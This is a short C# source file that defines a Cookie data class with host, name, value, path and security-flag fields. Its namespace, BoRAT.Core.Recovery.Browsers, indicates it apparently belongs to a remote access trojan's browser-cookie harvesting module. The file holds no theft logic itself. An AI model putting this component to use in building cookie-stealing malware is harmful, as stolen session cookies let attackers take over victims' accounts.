using System;

namespace BoRAT.Core.Recovery.Browsers
{
    public class Cookie
    {
        public string HostKey { get; set; }
        public string Name { get; set; }
        public string Value { get; set; }
        public string Path { get; set; }
        public string ExpiresUTC { get; set; }
        public string LastAccessUTC { get; set; }
        public bool Secure { get; set; }
        public bool HttpOnly { get; set; }
        public bool Expired { get; set; }
        public bool Persistent { get; set; }
        public bool Priority { get; set; }
        public string Browser { get; set; }

        public override string ToString()
        {
            return String.Format("{1}{0}{2}{0}{3}{0}{4}{0}{5}{0}{6}{0}{7}", 
                Environment.NewLine, HostKey, Name, Value, Path, Expired, HttpOnly, Secure);
        }
    }
}
